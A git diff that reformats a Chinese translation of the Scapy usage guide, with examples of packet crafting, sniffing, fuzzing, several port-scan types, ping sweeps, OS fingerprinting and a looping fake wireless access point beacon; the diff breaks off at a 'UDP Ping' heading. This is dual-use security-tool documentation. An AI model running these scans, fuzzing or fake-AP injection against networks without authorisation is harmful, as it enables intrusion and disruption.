@@ -1,20 +1,21 @@
 # Scapy中文使用文档
 
-- from:[http://www.secdev.org/projects/scapy/doc/usage.html]
-
-# 0x00 前言
+### 0x00 前言
 
 scapy是一个强大的交互式(interactive)的包操作程序，使用python写的，有一个python的命令行解释器界面，可直接运行，当然也可以作为第三库，导入到我们的python程序中去使用它的类和方法。
 
 关于scapy作者的一个简介：
 
-```Philippe Biondi is a research engineer at EADS Innovation Works(欧洲宇航防务集团创新中心). He works in the IT security lab, and is the creator of many programs like Scapy or ShellForge. Philippe authored chapter 6 of Security Power Tools, in which Scapy takes a good place, and also chapter 11.```
+```
+Philippe Biondi is a research engineer at EADS Innovation Works(欧洲宇航防务集团创新中心). He works in the IT security lab, and is the creator of many programs like Scapy or ShellForge. Philippe authored chapter 6 of Security Power Tools, in which Scapy takes a good place, and also chapter 11.
+```
 
 scapy可以仿造和解析大量协议类型的包，可以把包发到网上，或者捕捉包，可以match请求和回复。更强大的是它可以扫描路由器，扫描协议端口，攻击网络等等等等吧，非常之多，非常之强大。有人称它为可编程的wireshark，它的强大我现在也没能亲身体会，但我感觉它应该比wireshark强大。
 
-# 0x01 起航Scapy
+### 0x01 起航Scapy
 
 Scapy的交互shell是运行在一个终端会话当中。因为需要root权限才能发送数据包，所以我们在这里使用`sudo`。
+
 ```python
 $ sudo scapy
 Welcome to Scapy (2.0.1-dev)
@@ -22,6 +23,7 @@ Welcome to Scapy (2.0.1-dev)
 ```
 
 在Windows当中，请打开命令提示符（`cmd.exe`），并确保您拥有管理员权限：
+
 ```python
 C:\>scapy
 INFO: No IPv6 support in kernel
@@ -31,19 +33,22 @@ Welcome to Scapy (2.0.1-dev)
 ```
 
 如果您没有安装所有的可选包，Scapy将会告诉你有些功能不可用：
+
 ```
 INFO: Can't import python gnuplot wrapper . Won't be able to plot.
 INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
 ```
+
 虽然没有安装，但发送和接收数据包的基本功能仍能有效。
 
-# 0x02 互动教程
+### 0x02 互动教程
 
 本节将会告诉您一些Scapy的功能。让我们按上文所述打开Scapy，亲自尝试些例子吧。
 
-## 第一步
+#### 1、第一步
 
 让我们来建立一个数据包试一试
+
 ```python
 >>> a=IP(ttl=10)
 >>> a
@@ -61,9 +66,11 @@ INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
 >>> a.ttl
 64
 ```
-## 堆加层次（OSI参考模型）
+
+#### 2、堆加层次（OSI参考模型）
 
 “/”操作符在两层之间起到一个组合的作用。当使用该操作符时，下层可以根据其上层，使它的一个或多个默认字段被重载。（您仍可以赋予您想要的值）一个字符串也可以被用作原始层。
+
 ```python          
 >>> IP()
 <IP |>
@@ -78,9 +85,11 @@ INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
 >>> IP(proto=55)/TCP()
 <IP frag=0 proto=55 |<TCP |>>
 ```
-![](https://lyxw.github.io/assets/img/articles/scapy1.png)
+
+![](https://lyxw.github.io/assets/img/articles/scapy1.jpg)
 
 每一个数据包都可以被建立或分解（注意：在Python中“_”（下划线）是上一条语句执行的结果）：
+
 ```python
 >>> str(IP())
 'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'
@@ -108,7 +117,9 @@ FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.
  ack=0L dataofs=5L reserved=0L flags=S window=8192 chksum=0xbb39 urgptr=0
  options=[] |<Raw load='GET /index.html HTTP/1.0 \n\n' |>>>>
 ```
+
 我们看到一个分解的数据包将其所有的字段填充。那是因为我认为，附加有原始字符串的字段都有它自身的价值。如果这太冗长，`hide_defaults()`方法将会删除具有默认值的字段：
+
 ```python
 >>> c.hide_defaults()
 >>> c 
@@ -117,24 +128,26 @@ FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.
  chksum=0xbb39 options=[] |<Raw load='GET /index.html HTTP/1.0 \n\n' |>>>>
 ```
 
-## 读取PCAP文件
+#### 3、读取PCAP文件
 
 你可以从PCAP文件中读取数据包，并将其写入到一个PCAP文件中。
+
 ```python
 >>> a=rdpcap("/spare/captures/isakmp.cap")
 >>> a
 <isakmp.cap: UDP:721 TCP:0 ICMP:0 Other:0>
 ```
 
-## 图形转储（PDF，PS）
+#### 4、图形转储（PDF，PS）
 
 如果您已经安装PyX，您可以做一个数据包的图形PostScript/ PDF转储（见下面丑陋的PNG图像，PostScript/PDF则具有更好的质量...）
+
 ```python
 >>> a[423].pdfdump(layer_shift=1)
 >>> a[423].psdump("/tmp/isakmp_pkt.eps",layer_shift=1)
 ```
 
-![](https://lyxw.github.io/assets/img/articles/scapy2.png)
+![](https://lyxw.github.io/assets/img/articles/scapy2.jpg)
 
 | 命令                    | 效果                                     |
 | :---------------------- | :--------------------------------------- |
@@ -150,9 +163,10 @@ FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.
 | pkt.pdfdump()           | 绘制一个解释说明的PDF                    |
 | pkt.command()	          | 返回可以生成数据包的Scapy命令            |
 
-## 生成一组数据包
+#### 5、生成一组数据包
 
 目前我们只是生成一个数据包。让我们看看如何轻易地定制一组数据包。整个数据包的每一个字段（甚至是网络层次）都可以是一组。在这里隐含地定义了一组数据包的概念，意即是使用所有区域之间的笛卡尔乘积来生成的一组数据包。
+
 ```python
 >>> a=IP(dst="www.slashdot.org/30")
 >>> a
@@ -177,6 +191,7 @@ FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.
  <IP frag=0 proto=TCP dst=66.35.250.151 |<TCP dport=80 |>>,
  <IP frag=0 proto=TCP dst=66.35.250.151 |<TCP dport=443 |>>]
 ```
+
 某些操作（如修改一个数据包中的字符串）无法对于一组数据包使用。在这些情况下，如果您忘记展开您的数据包集合，只有您忘记生成的列表中的第一个元素会被用于组装数据包。    
 
 | 命令	          | 效果                                  |
@@ -193,9 +208,10 @@ FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02  .....P........P.
 | plot()	      | 规划一个应用到数据包列表的lambda函数  |
 | make table()	  | 根据lambda函数来显示表格              |
 
-## 发送数据包
+#### 6、发送数据包
 
 现在我们知道了如何处理数据包。让我们来看看如何发送它们。“send()”函数将会在第3层发送数据包。也就是说它会为你处理路由和第2层的数据。“send()”函数将会工作在第2层。选择合适的接口和正确的链路层协议都取决于你。
+
 ```python
 >>> send(IP(dst="1.2.3.4")/ICMP())
 .
@@ -211,18 +227,20 @@ Sent 16 packets.
 Sent 11 packets.
 ```
 
-## Fuzzing
+#### 7、Fuzzing
 
 `fuzz()`函数可以通过一个具有随机值、数据类型合适的对象，来改变任何默认值，但该值不能是被计算的（像校验和那样）。这使得可以快速建立循环模糊化测试模板。在下面的例子中，IP层是正常的，UDP层和NTP层被fuzz。UDP的校验和是正确的，UDP的目的端口被NTP重载为123，而且NTP的版本被更变为4.其他所有的端口将被随机分组：
+
 ```python
 >>> send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
 ................^C
 Sent 16 packets.
 ```
 
-## 发送和接收数据包（“sr”）
+#### 8、发送和接收数据包（“sr”）
 
 现在让我们做一些有趣的事情。“sr()”函数是用来发送数据包和接收应答。该函数返回一对数据包及其应答，还有无应答的数据包。“sr1()”函数是一种变体，用来返回一个应答数据包。发送的数据包必须是第3层报文（IP，ARP等）。“srp()”则是使用第2层报文（以太网，802.3等）。
+
 ```python
 >>> p=sr1(IP(dst="www.slashdot.org")/ICMP()/"XXXXXXXXXXX")
 Begin emission:
@@ -262,6 +280,7 @@ options   = ''
 ````
 
 DNS查询（“rd” = recursion desired）。主机192.168.5.1是我的DNS服务器。注意从我Linksys来的非空填充具有Etherleak缺陷：
+
 ```python
 >>> sr1(IP(dst="192.168.5.1")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.slashdot.org")))
 Begin emission:
@@ -275,7 +294,9 @@ Received 3 packets, got 1 answers, remaining 0 packets
  an=<DNSRR rrname='www.slashdot.org.' type=A rclass=IN ttl=3560L rdata='66.35.250.151' |>
  ns=0 ar=0 |<Padding load='\xc6\x94\xc7\xeb' |>>>>
 ```
+
 发送和接收函数族是scapy中的核心部分。它们返回一对两个列表。第一个就是发送的数据包及其应答组成的列表，第二个是无应答数据包组成的列表。为了更好地呈现它们，它们被封装成一个对象，并且提供了一些便于操作的方法：
+
 ```python
 >>> sr(IP(dst="192.168.8.1")/TCP(dport=[21,22,23]))
 Received 6 packets, got 3 answers, remaining 0 packets
@@ -286,15 +307,19 @@ IP / TCP 192.168.8.14:20 > 192.168.8.1:21 S ==> Ether / IP / TCP 192.168.8.1:21 
 IP / TCP 192.168.8.14:20 > 192.168.8.1:22 S ==> Ether / IP / TCP 192.168.8.1:22 > 192.168.8.14:20 RA / Padding
 IP / TCP 192.168.8.14:20 > 192.168.8.1:23 S ==> Ether / IP / TCP 192.168.8.1:23 > 192.168.8.14:20 RA / Padding
 ```
+
 如果对于应答数据包有速度限制，你可以通过`inter`参数来设置两个数据包之间等待的时间间隔。如果有些数据包丢失了，或者设置时间间隔不足以满足要求，你可以重新发送所有无应答数据包。你可以简单地对无应答数据包列表再调用一遍函数，或者去设置`retry`参数。如果retry设置为3，scapy会对无应答的数据包重复发送三次。如果retry设为-3，scapy则会一直发送无应答的数据包，直到满足`timeout`参数设置在最后一个数据包发出去之后的等待时间。
 
-## SYN Scans
+#### 9、SYN Scans
 
 在Scapy提示符中执行一下命令，可以对经典的SYN Scan初始化：
+
 ```python
 >>> sr1(IP(dst="72.14.207.99")/TCP(dport=80,flags="S"))
 ```
+
 以上向Google的80端口发送了一个SYN数据包，会在接收到一个应答后退出：
+
 ```python
 Begin emission:
 .Finished to send 1 packets.
@@ -306,17 +331,23 @@ proto=TCP chksum=0x6a34 src=72.14.207.99 dst=192.168.1.100 options=// |
 flags=SA window=8190 chksum=0xcdc7 urgptr=0 options=[('MSS', 536)] |
 <Padding  load='V\xf7' |>>>
 ```
+
 从以上的输出中可以看出，Google返回了一个SA（SYN-ACK）标志位，表示80端口是open的。
 
 使用其他标志位扫描一下系统的440到443端口：
+
 ```python
 >>> sr(IP(dst="192.168.1.1")/TCP(sport=666,dport=(440,443),flags="S"))
 ```
+
 或者
+
 ```python
 >>> sr(IP(dst="192.168.1.1")/TCP(sport=RandShort(),dport=[440,441,442,443],flags="S"))
 ```
+
 可以对收集的数据包进行摘要（summary），来快速地浏览响应：
+
 ```python
 >>> ans,unans = _
 >>> ans.summary()
@@ -325,7 +356,9 @@ IP / TCP 192.168.1.100:ftp-data > 192.168.1.1:441 S ======> IP / TCP 192.168.1.1
 IP / TCP 192.168.1.100:ftp-data > 192.168.1.1:442 S ======> IP / TCP 192.168.1.1:442 > 192.168.1.100:ftp-data RA / Padding
 IP / TCP 192.168.1.100:ftp-data > 192.168.1.1:https S ======> IP / TCP 192.168.1.1:https > 192.168.1.100:ftp-data SA / Padding
 ```
+
 以上显示了我们在扫描过程中的请求应答对。我们也可以用一个循环只显示我们感兴趣的信息：
+
 ```python
 >>> ans.summary( lambda(s,r): r.sprintf("%TCP.sport% \t %TCP.flags%") )
 440      RA
@@ -333,7 +366,9 @@ IP / TCP 192.168.1.100:ftp-data > 192.168.1.1:https S ======> IP / TCP 192.168.1
 442      RA
 https    SA
 ```
+
 可以使用`make_table()`函数建立一个表格，更好地显示多个目标信息：
+
 ```python
 >>> ans,unans = sr(IP(dst=["192.168.1.1","yahoo.com","slashdot.org"])/TCP(dport=[22,80,443],flags="S"))
 Begin emission:
@@ -348,19 +383,25 @@ Received 362 packets, got 8 answers, remaining 1 packets
 80  SA                           RA          SA
 443 SA                           SA          SA    
 ```
+
 在以上的例子中，如果接收到作为响应的ICMP数据包而不是预期的TCP数据包，就会打印出ICMP差错类型（error type）。
 
 对于更大型的扫描，我们可能对某个响应感兴趣，下面的例子就只显示设置了"SA"标志位的数据包：
+
 ```python
 >>> ans.nsummary(lfilter = lambda (s,r): r.sprintf("%TCP.flags%") == "SA")
 0003 IP / TCP 192.168.1.100:ftp_data > 192.168.1.1:https S ======> IP / TCP 192.168.1.1:https > 192.168.1.100:ftp_data SA
 ```
+
 如果我们想对响应进行专业分析，我们可以使用使用以下的命令显示哪些端口是open的：
+
 ```python
 >>> ans.summary(lfilter = lambda (s,r): r.sprintf("%TCP.flags%") == "SA",prn=lambda(s,r):r.sprintf("%TCP.sport% is open"))
 https is open
 ```
+
 对于更大型的扫描，我们可以建立一个端口开放表：
+
 ```python
 >>> ans.filter(lambda (s,r):TCP in r and r[TCP].flags&2).make_table(lambda (s,r):
 ...             (s.dst, s.dport, "X"))
@@ -368,7 +409,9 @@ https is open
 80  X             -           X
 443 X             X           X
 ```
+
 如果以上的方法还不够，Scapy还包含一个`report_ports()`函数，该函数不仅可以自动化SYN scan，而且还会对收集的结果以LaTeX形式输出：
+
 ```python
 >>> report_ports("192.168.1.1",(440,443))
 Begin emission:
@@ -380,9 +423,10 @@ Received 8 packets, got 4 answers, remaining 0 packets
 TCP RA \\\\\n\\hline\n\\hline\n\\end{tabular}\n'
 ```
 
-## TCP traceroute
+#### 10、TCP traceroute
 
-TCP路由追踪：    
+TCP路由追踪：
+    
 ```python
 >>> ans,unans=sr(IP(dst=target, ttl=(4,25),id=RandShort())/TCP(flags=0x2))
 *****.******.*.***..*.**Finished to send 22 packets.
@@ -413,7 +457,9 @@ Received 33 packets, got 21 answers, remaining 1 packets
 23 173.29.39.101 1
 24 173.29.39.101 1
 ```
+
 注意：TCP路由跟踪和其他高级函数早已被构造好了：
+
 ```python
 >>> lsc()
 sr               : Send and receive packets at layer 3
@@ -439,17 +485,19 @@ dyndns_del       : Send a DNS delete message to a nameserver for "name"
 [...]
 ```
 
-## 配置高级sockets
+#### 11、配置高级sockets
 
 发送和接收数据包的过程是相当复杂的。我想用PF_PACKET接口来通过netfilter，我也需要实现一个ARP堆栈、ARP缓存和一个堆栈。在以太网和ppp接口上看来可以工作，但我不保证任何事情。不管怎样,事实上我使用一种super-socket，这意味着你可以很容易的切换IO层，并使用PF_INET / SOCK_RAW，或者使用PF_PACKET的级别2(得到LL头(以太网,…)和自己的mac地址,…)。我刚刚添加了一个使用libdnet和libpcap,的super socket，所以它应该可以移植：
+
 ```python
 >>> conf.L3socket=L3dnetSocket
 >>> conf.L3listen=L3pcapListenSocket
 ```
 
-## Sniffing
+#### 12、Sniffing
 
 我们可以简单地捕获数据包，或者是克隆tcpdump或tethereal的功能。如果没有指定interface，则会 在所有的interface上进行嗅探：
+
 ```python
 >>>  sniff(filter="icmp and host 66.35.250.151", count=2)
 <Sniffed: UDP:0 TCP:0 ICMP:2 Other:0>
@@ -537,7 +585,9 @@ type      = 0x800
 ---[ Padding ]---
             load      = '\n_\x00\x0b'
 ```
+
 对于控制输出信息，我们可以使用`sprintf()`函数：
+
 ```python
 >>> pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%\n}{Raw:%Raw.load%\n}"))
 192.168.1.100 -> 64.233.167.99    
@@ -555,7 +605,9 @@ en-us,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset:
 ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nKeep-Alive: 300\r\nConnection:
 keep-alive\r\nCache-Control: max-age=0\r\n\r\n'
 ```
+
 我们可以嗅探并进行被动操作系统指纹识别：
+
 ```python
 >>> p
 <Ether dst=00:10:4b:b3:7d:4e src=00:40:33:96:7b:60 type=0x800 |<IP version=4L
@@ -573,11 +625,13 @@ keep-alive\r\nCache-Control: max-age=0\r\n\r\n'
 (0.875, ['Linux 2.4.2 - 2.4.14 (1)', 'Linux 2.4.10 (1)', 'Windows 98 (?)'])
 (1.0, ['Windows 2000 (9)'])
 ```
+
 猜测操作系统版本前的数字为猜测的精确度。
 
-## Filters
+#### 13、Filters
 
-演示一下bpf过滤器和`sprintf()`方法：    
+演示一下bpf过滤器和`sprintf()`方法：
+    
 ```python
 >>> a=sniff(filter="tcp and ( port 25 or port 110 )",
  prn=lambda x: x.sprintf("%IP.src%:%TCP.sport% -> %IP.dst%:%TCP.dport%  %2s,TCP.flags% : %TCP.payload%"))
@@ -603,9 +657,10 @@ keep-alive\r\nCache-Control: max-age=0\r\n\r\n'
 213.228.0.14:110 -> 192.168.8.10:47226   A :
 ```
 
-## 在循环中接收和发送
+#### 14、在循环中接收和发送
 
 这儿有一个例子来实现类似`(h)ping`的功能：你一直发送同样的数据包集合来观察是否发生变化：
+
 ```python
 >>> srloop(IP(dst="www.target.com/30")/TCP())
 RECV 1: Ether / IP / TCP 192.168.11.99:80 > 192.168.8.14:20 SA / Padding
@@ -626,28 +681,34 @@ fail 3: IP / TCP 192.168.8.14:20 > 192.168.11.96:80 S
         IP / TCP 192.168.8.14:20 > 192.168.11.97:80 S
 ```
 
-## 导入和导出数据
+#### 15、导入和导出数据
 
-### PCAP
+##### PCAP
 
 通常可以将数据包保存为pcap文件以备后用，或者是供其他的应用程序使用：
+
 ```python
 >>> wrpcap("temp.cap",pkts)
 ```
+
 还原之前保存的pcap文件：
-```python
->>> pkts = rdpcap("temp.cap")
-```
-或者
+
 ```python
 >>> pkts = rdpcap("temp.cap")
 ```
 
-### Hexdump
+或者
+
+```python
+>>> pkts = rdpcap("temp.cap")
+```
+
+##### Hexdump
 
 Scapy允许你以不同的十六进制格式输出编码的数据包。
 
 使用`hexdump()`函数会以经典的hexdump格式输出数据包：
+
 ```python
 >>> hexdump(pkt)
 0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.
@@ -658,7 +719,9 @@ Scapy允许你以不同的十六进制格式输出编码的数据包。
 0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   &'()*+,-./012345
 0060   36 37                                              67
 ```
+
 使用`import_hexcap()`函数可以将以上的hexdump重新导入到Scapy中：
+
 ```python
 >>> pkt_hex = Ether(import_hexcap())
 0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.
@@ -677,9 +740,10 @@ Scapy允许你以不同的十六进制格式输出编码的数据包。
  \x1f !"#$%&\'()*+,-./01234567' |>>>>
 ```
 
-### Hex string
+##### Hex string
 
-使用`str()`函数可以将整个数据包转换成十六进制字符串：    
+使用`str()`函数可以将整个数据包转换成十六进制字符串：
+    
 ```python
 >>> pkts = sniff(count = 1)
 >>> pkt = pkts[0]
@@ -697,7 +761,9 @@ Scapy允许你以不同的十六进制格式输出编码的数据包。
  \x08\t\n\x0b\x0c\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b
  \x1c\x1d\x1e\x1f !"#$%&\'()*+,-./01234567'
 ```
+
 通过选择合适的起始层（例如“Ether()”），我们可以重新导入十六进制字符串。
+
 ```python
 >>> new_pkt = Ether(pkt_str)
 >>> new_pkt
@@ -709,9 +775,10 @@ Scapy允许你以不同的十六进制格式输出编码的数据包。
  \x1f !"#$%&\'()*+,-./01234567' |>>>>
 ```
 
-### Base64
+##### Base64
 
 使用`export_object()`函数，Scapy可以数据包转换成base64编码的Python数据结构：
+
 ```python
 >>> pkt
 <Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |<IP  version=4L
@@ -727,7 +794,9 @@ bMlhCrsUSYrYoKbmcxZFXSpPiohlZikm6ltb063ZdGpNOjWQ7mhPt62hChHJWTbFvb0O/u1MD2bT
 WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
 ...
 ```
+
 使用`import_object()`函数，可以将以上输出重新导入到Scapy中：
+
 ```python
 >>> new_pkt = import_object()
 eNplVwd4FNcRPt2dTqdTQ0JUUYwN+CgS0gkJONFEs5WxFDB+CdiI8+pupVl0d7uzRUiYtcEGG4ST
@@ -744,15 +813,18 @@ WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
  !"#$%&\'()*+,-./01234567' |>>>>
 ```
 
-### Sessions
+##### Sessions
 
 最后可以使用“save_session()”函数来保存所有的session变量：
+
 ```python
 >>> dir()
 ['__builtins__', 'conf', 'new_pkt', 'pkt', 'pkt_export', 'pkt_hex', 'pkt_str', 'pkts']
 >>> save_session("session.scapy")
 ```
+
 使用`load_session()`函数，在下一次你启动Scapy的时候你就能加载保存的session：
+
 ```python
 >>> dir()
 ['__builtins__', 'conf']
@@ -761,11 +833,12 @@ WZXXVCmi9pihUqI3FHdEQslriiVfWFTVT9VYpog6Q7fsjG0qRWtQNwsW1fRTrUg4xZxq5pUx1aS6
 ['__builtins__', 'conf', 'new_pkt', 'pkt', 'pkt_export', 'pkt_hex', 'pkt_str', 'pkts']
 ```
 
-## Making tables
+#### 16、Making tables
 
 现在我们来演示一下`make_table()`函数的功能。该函数的需要一个列表和另一个函数（返回包含三个元素的元组）作为参数。第一个元素是表格x轴上的一个值，第二个元素是y轴上的值，第三个原始则是坐标(x,y)对应的值，其返回结果为一个表格。这个函数有两个变种，`make_lined_table()`和`make_tex_table()`来复制/粘贴到你的LaTeX报告中。这些函数都可以作为一个结果对象的方法：
 
-在这里，我们可以看到一个多机并行的traceroute（Scapy的已经有一个多TCP路由跟踪功能，待会儿可以看到）：    
+在这里，我们可以看到一个多机并行的traceroute（Scapy的已经有一个多TCP路由跟踪功能，待会儿可以看到）：
+    
 ```python
 >>> ans,unans=sr(IP(dst="www.test.fr/30", ttl=(1,6))/TCP())
 Received 49 packets, got 24 answers, remaining 0 packets
@@ -778,7 +851,9 @@ Received 49 packets, got 24 answers, remaining 0 packets
 5 193.251.254.1   193.251.251.69  193.251.254.1   193.251.251.69
 6 193.251.241.174 193.251.241.178 193.251.241.174 193.251.241.178
 ```
+
 这里有个更复杂的例子：从他们的IPID字段中识别主机。我们可以看到172.20.80.200只有22端口做出了应答，而172.20.80.201则对所有的端口都有应答，而且172.20.80.197对25端口没有应答，但对其他端口都有应答。
+
 ```python
 >>> ans,unans=sr(IP(dst="172.20.80.192/28")/TCP(dport=[20,21,22,25,53,80]))
 Received 142 packets, got 25 answers, remaining 71 packets
@@ -791,11 +866,13 @@ Received 142 packets, got 25 answers, remaining 71 packets
 53 0             4207          7025          -             11566
 80 0             4028          7026          -             11567
 ```
+
 你在使用TTL和显示接收到的TTL等情况下，它可以很轻松地帮你识别网络拓扑结构。
 
-## Routing
+#### 17、Routing
 
 现在Scapy有自己的路由表了，所以将你的数据包以不同于操作系统的方式路由：
+
 ```python
 >>> conf.route
 Network         Netmask         Gateway         Iface
@@ -819,20 +896,22 @@ Network         Netmask         Gateway         Iface
 0.0.0.0         0.0.0.0         192.168.8.1     eth0
 ```
 
-## Gnuplot
+#### 18、Gnuplot
 
 我们可以很容易地将收集起来的数据绘制成Gnuplot。（清确保你已经安装了Gnuplot-py和Gnuplot）例如，我们可以通过观察图案知道负载平衡器用了多少个不同的IP堆栈：
+
 ```python
 >>> a,b=sr(IP(dst="www.target.com")/TCP(sport=[RandShort()]*1000))
 >>> a.plot(lambda x:x[1].id)
 <Gnuplot._Gnuplot.Gnuplot instance at 0xb7d6a74c>
 ```
 
-![](https://lyxw.github.io/assets/img/articles/scapy3.png)
+![](https://lyxw.github.io/assets/img/articles/scapy3.jpg)
 
-## TCP traceroute (2)
+#### 19、TCP traceroute (2)
 
-Scapy也有强大的TCP traceroute功能。并不像其他traceroute程序那样，需要等待每个节点的回应才去下一个节点，scapy会在同一时间发送所有的数据包。其缺点就是不知道什么时候停止（所以就有maxttl参数），其巨大的优点就是，只用了不到3秒，就可以得到多目标的traceroute结果：    
+Scapy也有强大的TCP traceroute功能。并不像其他traceroute程序那样，需要等待每个节点的回应才去下一个节点，scapy会在同一时间发送所有的数据包。其缺点就是不知道什么时候停止（所以就有maxttl参数），其巨大的优点就是，只用了不到3秒，就可以得到多目标的traceroute结果：
+    
 ```python
 >>> traceroute(["www.yahoo.com","www.altavista.com","www.wisenut.com","www.copernic.com"],maxttl=20)
 Received 80 packets, got 80 answers, remaining 0 packets
@@ -859,7 +938,9 @@ Received 80 packets, got 80 answers, remaining 0 packets
 20 193.45.10.88    SA 216.109.118.79  SA 64.241.242.243  SA 66.94.229.254   SA
 (<Traceroute: UDP:0 TCP:28 ICMP:52 Other:0>, <Unanswered: UDP:0 TCP:0 ICMP:0 Other:0>)
 ```
+
 最后一行实际上是该函数的返回结果：traceroute返回一个对象和无应答数据包列表。traceroute返回的是一个经典返回对象更加特殊的版本（实际上是一个子类）。我们可以将其保存以备后用，或者是进行一些例如检查填充的更深层次的观察：
+
 ```python
 >>> result,unans=_
 >>> result.show()
@@ -870,7 +951,9 @@ Received 80 packets, got 80 answers, remaining 0 packets
 [...]
 >>> result.filter(lambda x: Padding in x[1])
 ```
+
 和其他返回对象一样，traceroute对象也可以相加：
+
 ```python
 >>> r2,unans=traceroute(["www.voila.com"],maxttl=20)
 Received 19 packets, got 19 answers, remaining 1 packets
@@ -919,7 +1002,9 @@ Received 19 packets, got 19 answers, remaining 1 packets
 19 195.101.94.25   SA 212.23.37.13    SA 216.109.118.72  SA 64.241.242.243  SA 66.94.229.254   SA
 20 195.101.94.25   SA 212.23.37.13    SA 216.109.118.72  SA 64.241.242.243  SA 66.94.229.254   SA
 ```
+
 Traceroute返回对象有一个非常实用的功能：他们会将得到的所有路线做成一个有向图，并用AS组织路线。你需要安装graphviz。在默认情况下会使用ImageMagick显示图形。
+
 ```python
 >>> res,unans = traceroute(["www.microsoft.com","www.cisco.com","www.yahoo.com","www.wanadoo.fr","www.pacsec.com"],dport=[80,443],maxttl=20,retry=-2)
 Received 190 packets, got 190 answers, remaining 10 packets
@@ -933,26 +1018,30 @@ Received 190 packets, got 190 answers, remaining 10 packets
 >>> res.graph(target="> /tmp/graph.svg") # saved to file
 ```
 
-![](https://lyxw.github.io/assets/img/articles/scapy4.png)
+![](https://lyxw.github.io/assets/img/articles/scapy4.jpg)
 
 如果你安装了VPython，你就可以用3D来表示traceroute。右边的按钮是旋转图案，中间的按钮是放大缩小，左边的按钮是移动图案。如果你单击一个球，它的IP地址就会出现/消失。如果你按住Ctrl单击一个球，就会扫描21,22,23,25,80和443端口，并显示结果：
+
 ```python
 >>> res.trace3D()
 ```
 
-![](https://lyxw.github.io/assets/img/articles/scapy5.png)
+![](https://lyxw.github.io/assets/img/articles/scapy5.jpg)
 
-![](https://lyxw.github.io/assets/img/articles/scapy6.png)
+![](https://lyxw.github.io/assets/img/articles/scapy6.jpg)
 
-## Wireless frame injection
+#### 20、Wireless frame injection
 
 frame injection的前提是你的无线网卡和驱动得正确配置好。
+
 ```python
 $ ifconfig wlan0 up
 $ iwpriv wlan0 hostapd 1
 $ ifconfig wlan0ap up
 ```
+
 你可以造一个FakeAP：
+
 ```python
 >>> sendp(Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=RandMAC(),addr3=RandMAC())/
           Dot11Beacon(cap="ESS")/
@@ -962,111 +1051,140 @@ $ ifconfig wlan0ap up
           Dot11Elt(ID="TIM",info="\x00\x01\x00\x00"),iface="wlan0ap",loop=1)
 ```
 
-# 0x03　Simple one-liners
+### 0x03　Simple one-liners
 
-## ACK Scan
+#### 1、ACK Scan
 
 使用Scapy强大的数据包功能，我们可以快速地复制经典的TCP扫描。例如，模拟ACK Scan将会发送以下字符串：
+
 ```python
 >>> ans,unans = sr(IP(dst="www.slashdot.org")/TCP(dport=[80,666],flags="A"))
 ```
+
 我们可以在有应答的数据包中发现未过滤的端口：
+
 ```python
 >>> for s,r in ans:
 ...     if s[TCP].dport == r[TCP].sport:
 ...         print str(s[TCP].dport) + " is unfiltered"
 ````
+
 同样的，可以在无应答的数据包中发现过滤的端口：
+
 ```python
 >>> for s in unans:
 ...     print str(s[TCP].dport) + " is filtered"
 ```
 
-## Xmas Scan
+#### 2、Xmas Scan
 
 可以使用以下的命令来启动Xmas Scan：
+
 ```python
 >>> ans,unans = sr(IP(dst="192.168.1.1")/TCP(dport=666,flags="FPU") )
 ```
+
 有RST响应则意味着目标主机的对应端口是关闭的。
 
-## IP Scan
+#### 3、IP Scan
 
 较低级的IP Scan可以用来枚举支持的协议：
+
 ```python
 >>> ans,unans=sr(IP(dst="192.168.1.1",proto=(0,255))/"SCAPY",retry=2)
 ```
 
-## ARP Ping
+#### 4、ARP Ping
 
 在本地以太网络上最快速地发现主机的方法莫过于ARP Ping了：
+
 ```python
 >>> ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24"),timeout=2)
 ```
+
 用以下命令可以来审查应答：
+
 ```python
 >>> ans.summary(lambda (s,r): r.sprintf("%Ether.src% %ARP.psrc%") )
 ```
+
 Scapy还包含内建函数`arping()`,该函数实现的功能和以上的两个命令类似：
+
 ```python
 >>> arping("192.168.1.*")
 ```
 
-## ICMP Ping
+#### 5、ICMP Ping
 
 可以用以下的命令来模拟经典的ICMP Ping：
+
 ```python
 >>> ans,unans=sr(IP(dst="192.168.1.1-254")/ICMP())
 ```
+
 用以下的命令可以收集存活主机的信息：
+
 ```python
 >>> ans.summary(lambda (s,r): r.sprintf("%IP.src% is alive") )
 ```
 
-## TCP Ping
+#### 6、TCP Ping
 
 如果ICMP　echo请求被禁止了，我们依旧可以用不同的TCP Pings，就像下面的TCP SYN Ping:
+
 ```python
 >>> ans,unans=sr( IP(dst="192.168.1.*")/TCP(dport=80,flags="S") )
 ```
+
 对我们的刺探有任何响应就意味着为一台存活主机，可以用以下的命令收集结果：
+
 ```python
 >>> ans.summary( lambda(s,r) : r.sprintf("%IP.src% is alive") )
 ```
 
-## UDP Ping
+#### 7、UDP Ping
 
